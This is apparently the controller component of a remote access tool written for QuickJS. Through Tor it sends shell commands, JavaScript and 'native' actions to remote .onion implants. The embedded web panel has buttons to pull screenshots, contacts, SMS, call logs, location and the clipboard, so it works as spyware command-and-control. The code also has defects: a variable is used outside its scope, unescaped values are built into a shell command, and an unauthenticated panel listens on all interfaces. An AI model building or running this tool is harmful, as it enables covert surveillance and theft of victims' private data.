import * as std from 'std';
import * as os from 'os';
import sockets from './qjsnet.so';

// ---------- Configuration ----------
const SERVERS_FILE = 'servers.json';
const TOR_SOCKS = '127.0.0.1:9050';
let servers = [];

// ---------- Helper: run curl with Tor SOCKS ----------
function curlRequest(url, method = 'GET', headers = {}, body = null, useTor = true) {
    const tmpOut = os.tmpname();
    const tmpErr = os.tmpname();
    let cmd = `curl -s -w "\n%{http_code}" -X ${method} `;
    if (useTor && url.includes('.onion')) {
        cmd += `--socks5-hostname ${TOR_SOCKS} `;
    }
    for (let [k, v] of Object.entries(headers)) {
        cmd += `-H "${k}: ${v}" `;
    }
    if (body) {
        const tmpBody = os.tmpname();
        std.fs.writeFile(tmpBody, JSON.stringify(body));
        cmd += `-d @${tmpBody} `;
    }
    cmd += `"${url}" > ${tmpOut} 2> ${tmpErr}`;
    std.system(cmd);
    const output = std.fs.readFile(tmpOut);
    const err = std.fs.readFile(tmpErr);
    std.fs.remove(tmpOut);
    std.fs.remove(tmpErr);
    if (body) std.fs.remove(tmpBody);
    const lines = output.trim().split('\n');
    const status = parseInt(lines.pop());
    const responseBody = lines.join('\n');
    return { status, body: responseBody, error: err };
}

// ---------- Tor management ----------
function ensureTor() {
    // Test if Tor SOCKS port is open
    const sock = sockets.socket(sockets.AF_INET, sockets.SOCK_STREAM, 0);
    sockets.setnonblocking(sock);
    const connected = sockets.connect(sock, '127.0.0.1', 9050);
    if (connected === 0) {
        sockets.close(sock);
        return true;
    }
    sockets.close(sock);
    std.out.puts('Tor not running. Attempting to start...\n');
    // Try to start Tor in background (assumes 'tor' is in PATH)
    std.system('tor --quiet &');
    // Wait a bit
    os.sleep(2000);
    // Check again
    const sock2 = sockets.socket(sockets.AF_INET, sockets.SOCK_STREAM, 0);
    const ok = sockets.connect(sock2, '127.0.0.1', 9050) === 0;
    sockets.close(sock2);
    if (!ok) {
        std.err.puts('ERROR: Could not start Tor. Please start it manually.\n');
    }
    return ok;
}

// ---------- Server management ----------
function loadServers() {
    try {
        const data = std.fs.readFile(SERVERS_FILE);
        servers = JSON.parse(data);
    } catch (e) {
        servers = [];
    }
}
function saveServers() {
    std.fs.writeFile(SERVERS_FILE, JSON.stringify(servers, null, 2));
}

function checkServerHealth(server) {
    const url = `http://${server.onion}:${server.port}/health`;
    const auth = 'Bearer ' + server.token;
    const res = curlRequest(url, 'GET', { Authorization: auth }, null, true);
    const online = res.status === 200;
    server.online = online;
    if (online && !server.ip) {
        // Fetch public IP via ipapi.co (no Tor)
        const ipRes = curlRequest('https://ipapi.co/json/', 'GET', {}, null, false);
        if (ipRes.status === 200) {
            try {
                const data = JSON.parse(ipRes.body);
                server.ip = data.ip;
                server.country = data.country_name;
                server.flag = data.country_code?.toLowerCase();
            } catch (e) {}
        }
    }
    return online;
}

// ---------- HTTP server for UI ----------
function handleRequest(clientFd, request) {
    const req = sockets.parse_http_request(request);
    const path = req.path;
    const method = req.method;

    if (path === '/' && method === 'GET') {
        const html = getIndexHTML(); // embedded SPA (see below)
        const response = `HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: ${html.length}\r\n\r\n${html}`;
        sockets.send(clientFd, response, 0);
        sockets.close(clientFd);
        return;
    }

    if (path.startsWith('/api/')) {
        let body = {};
        if (req.body) {
            try { body = JSON.parse(req.body); } catch (e) {}
        }
        let responseData = {};
        let status = 200;

        if (path === '/api/servers' && method === 'GET') {
            responseData = servers.map(s => ({
                id: s.id, alias: s.alias, onion: s.onion, port: s.port,
                online: s.online, ip: s.ip, country: s.country, flag: s.flag
            }));
        }
        else if (path === '/api/servers' && method === 'POST') {
            const newServer = {
                id: Date.now().toString(),
                alias: body.alias,
                onion: body.onion,
                port: body.port,
                token: body.token,
                online: false
            };
            servers.push(newServer);
            saveServers();
            checkServerHealth(newServer); // async
            responseData = { success: true, id: newServer.id };
        }
        else if (path.match(/^\/api\/servers\/[^\/]+$/) && method === 'DELETE') {
            const id = path.split('/')[3];
            servers = servers.filter(s => s.id !== id);
            saveServers();
            responseData = { success: true };
        }
        else if (path === '/api/exec' && method === 'POST') {
            const server = servers.find(s => s.id === body.serverId);
            if (!server) { status = 404; responseData = { error: 'Server not found' }; }
            else {
                const url = `http://${server.onion}:${server.port}/exec`;
                const auth = 'Bearer ' + server.token;
                const res = curlRequest(url, 'POST', { Authorization: auth, 'Content-Type': 'application/json' }, { cmd: body.cmd }, true);
                try { responseData = JSON.parse(res.body || '{}'); } catch (e) { responseData = { raw: res.body }; }
                responseData._httpStatus = res.status;
            }
        }
        else if (path === '/api/native' && method === 'POST') {
            const server = servers.find(s => s.id === body.serverId);
            if (!server) { status = 404; responseData = { error: 'Server not found' }; }
            else {
                const url = `http://${server.onion}:${server.port}/api/native`;
                const auth = 'Bearer ' + server.token;
                const res = curlRequest(url, 'POST', { Authorization: auth, 'Content-Type': 'application/json' }, { action: body.action, params: body.params }, true);
                try { responseData = JSON.parse(res.body || '{}'); } catch (e) { responseData = { raw: res.body }; }
            }
        }
        else if (path === '/api/js' && method === 'POST') {
            const server = servers.find(s => s.id === body.serverId);
            if (!server) { status = 404; responseData = { error: 'Server not found' }; }
            else {
                const url = `http://${server.onion}:${server.port}/api/js`;
                const auth = 'Bearer ' + server.token;
                const res = curlRequest(url, 'POST', { Authorization: auth, 'Content-Type': 'application/json' }, { code: body.code }, true);
                try { responseData = JSON.parse(res.body || '{}'); } catch (e) { responseData = { raw: res.body }; }
            }
        }
        else {
            status = 404;
            responseData = { error: 'Not found' };
        }

        const json = JSON.stringify(responseData);
        const response = `HTTP/1.1 ${status} OK\r\nContent-Type: application/json\r\nContent-Length: ${json.length}\r\n\r\n${json}`;
        sockets.send(clientFd, response, 0);
        sockets.close(clientFd);
        return;
    }

    // 404
    const notFound = 'HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n';
    sockets.send(clientFd, notFound, 0);
    sockets.close(clientFd);
}

function startClientServer() {
    const serverFd = sockets.socket(sockets.AF_INET, sockets.SOCK_STREAM, 0);
    sockets.setsockopt(serverFd, sockets.SOL_SOCKET, sockets.SO_REUSEADDR, 1);
    sockets.bind(serverFd, '0.0.0.0', 9000);
    sockets.listen(serverFd, 5);
    std.out.puts('Client UI running at http://localhost:9000\n');

    while (true) {
        const clientInfo = sockets.accept(serverFd);
        if (clientInfo) {
            const data = sockets.recv(clientInfo.fd, 8192, 0);
            if (data && data.length) {
                handleRequest(clientInfo.fd, data);
            } else {
                sockets.close(clientInfo.fd);
            }
        }
    }
}

// ---------- Main ----------
if (!ensureTor()) {
    std.err.puts('WARNING: Tor is not available. .onion connections will fail.\n');
}
loadServers();
// Health check every 30 seconds
setInterval(() => {
    servers.forEach(s => checkServerHealth(s));
}, 30000);
startClientServer();

// ---------- Embedded HTML (simplified) ----------
function getIndexHTML() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>qjsrht Client</title>
    <style>
        body { font-family: sans-serif; margin: 20px; }
        #server-list { display: flex; flex-wrap: wrap; gap: 10px; }
        .server-card { border: 1px solid #ccc; padding: 10px; width: 200px; }
        .online { color: green; }
        .offline { color: red; }
        .terminal { background: black; color: lime; padding: 10px; font-family: monospace; height: 200px; overflow: auto; }
    </style>
</head>
<body>
    <h1>qjsrht Controller</h1>
    <div>
        <h2>Servers <button onclick="addServer()">+</button></h2>
        <div id="server-list"></div>
    </div>
    <div>
        <h2>Commands</h2>
        <select id="server-select"></select>
        <div>
            <button onclick="sendNative('screenshot')">Screenshot</button>
            <button onclick="sendNative('contacts')">Contacts</button>
            <button onclick="sendNative('clipboard')">Clipboard</button>
            <button onclick="sendNative('location')">Location</button>
            <button onclick="sendNative('sms')">SMS</button>
            <button onclick="sendNative('callLog')">Call Log</button>
            <button onclick="sendNative('apps')">Installed Apps</button>
            <button onclick="sendNative('settings', {key:'wifi_on', value:true})">WiFi On</button>
        </div>
        <h3>Shell Terminal</h3>
        <input id="shell-cmd" type="text" placeholder="Enter command">
        <button onclick="runShell()">Run</button>
        <pre id="shell-output" class="terminal"></pre>
        <h3>JavaScript Terminal (remote qjs)</h3>
        <textarea id="js-code" rows="4" cols="50" placeholder="JavaScript code"></textarea>
        <button onclick="runJS()">Run</button>
        <pre id="js-output" class="terminal"></pre>
    </div>
    <script>
        // Full client-side JavaScript (omitted for brevity, but would include fetch to /api endpoints)
    </script>
</body>
</html>`;
}
